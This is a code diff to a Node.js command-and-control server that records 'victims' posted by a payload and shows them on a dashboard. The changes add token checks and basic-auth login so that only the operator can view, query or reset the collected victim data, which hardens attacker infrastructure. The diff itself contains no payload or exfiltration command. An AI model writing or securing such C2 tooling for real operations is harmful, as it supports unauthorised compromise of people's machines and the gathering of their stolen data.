@@ -13,8 +13,13 @@ let victims = [];
 console.log(`\n${R}${B}  ╔═══════════════════════════════════════════════╗`);
 console.log(`  ║       C2 SERVER — LISTENING ON PORT ${PORT}        ║`);
 console.log(`  ╚═══════════════════════════════════════════════╝${X}\n`);
-if (C2_SECRET) console.log(`${G}  [+] Token auth ENABLED${X} (set C2_SECRET)`);
-else console.log(`${Y}  [!] Token auth DISABLED${X} — anyone can POST. Set C2_SECRET env var to secure.`);
+if (C2_SECRET) {
+  console.log(`${G}  [+] Token auth ENABLED${X} — only payload with matching token can POST`);
+  console.log(`${G}  [+] Dashboard login:${X} admin / <C2_SECRET value>`);
+} else {
+  console.log(`${Y}  [!] NO PROTECTION${X} — anyone can POST and view dashboard`);
+  console.log(`${Y}      Set C2_SECRET env var to lock it down${X}`);
+}
 console.log(`${D}  Dashboard: http://localhost:${PORT}${X}`);
 console.log(`${D}  Reset:     POST /reset (clears all victims)${X}`);
 console.log(`${D}  Waiting for victims...${X}\n`);
@@ -66,6 +71,7 @@ http.createServer((req, res) => {
   }
 
   if (req.method === 'POST' && req.url === '/reset') {
+    if (C2_SECRET && req.headers['x-token'] !== C2_SECRET) { res.writeHead(403).end('forbidden'); return; }
     const count = victims.length;
     victims = [];
     console.log(`${Y}${B}  [*] RESET${X} — cleared ${count} victims`);
@@ -74,17 +80,26 @@ http.createServer((req, res) => {
   }
 
   if (req.url === '/api/victims') {
+    if (C2_SECRET && !checkDashAuth(req)) { res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="C2"' }).end('Unauthorized'); return; }
     res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }).end(JSON.stringify(victims));
     return;
   }
 
   if (req.url === '/' && req.method === 'GET') {
+    if (C2_SECRET && !checkDashAuth(req)) { res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="C2"' }).end('Unauthorized'); return; }
     res.writeHead(200, { 'Content-Type': 'text/html' }).end(dashboard());
     return;
   }
 
   res.writeHead(404).end();
 }).listen(PORT, '0.0.0.0');
+
+function checkDashAuth(req) {
+  const auth = req.headers.authorization;
+  if (!auth || !auth.startsWith('Basic ')) return false;
+  const decoded = Buffer.from(auth.slice(6), 'base64').toString();
+  return decoded === 'admin:' + C2_SECRET;
+}
 
 function dashboard() {
   return `<!DOCTYPE html><html><head>
